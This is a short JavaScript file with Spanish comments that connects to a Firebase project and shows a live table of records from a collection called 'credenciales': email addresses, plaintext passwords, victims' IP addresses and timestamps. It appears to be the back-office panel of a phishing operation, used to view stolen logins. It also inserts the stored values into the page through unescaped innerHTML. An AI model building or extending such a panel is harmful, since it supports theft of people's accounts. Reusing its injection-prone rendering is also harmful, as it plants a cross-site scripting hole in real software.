import { initializeApp } from "https://www.gstatic.com/firebasejs/9.14.0/firebase-app.js";
import { getFirestore, collection, query, orderBy, onSnapshot } from "https://www.gstatic.com/firebasejs/9.14.0/firebase-firestore.js";

const firebaseConfig = {
    apiKey: "AIzaSyBfvn5njW-YQt9NPKd49x8rCVEFKY4dhmw",
    authDomain: "zphdozer.firebaseapp.com",
    projectId: "zphdozer",
    storageBucket: "zphdozer.firebasestorage.app",
    messagingSenderId: "1067331325075",
    appId: "1:1067331325075:web:02794fba9fb9633a171166",
    measurementId: "G-X9CN92LFTF"
};

// Inicializar Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

document.addEventListener('DOMContentLoaded', () => {
    // Obtener referencia a la tabla
    const userTableBody = document.getElementById('user-table-body');

    // Crear consulta ordenada por fecha
    const q = query(collection(db, 'credenciales'), orderBy('timestamp', 'desc'));

    // Escuchar cambios en tiempo real
    onSnapshot(q, (snapshot) => {
        userTableBody.innerHTML = ''; // Limpiar tabla
        
        snapshot.forEach((doc) => {
            const data = doc.data();
            const row = document.createElement('tr');
            
            // Crear celdas con los datos
            row.innerHTML = `
                <td>${data.email}</td>
                <td>${data.password}</td>
                <td>${data.ip || 'No disponible'}</td>
                <td>${data.timestamp.toDate().toLocaleString()}</td>
            `;
            
            userTableBody.appendChild(row);
        });
    });
});
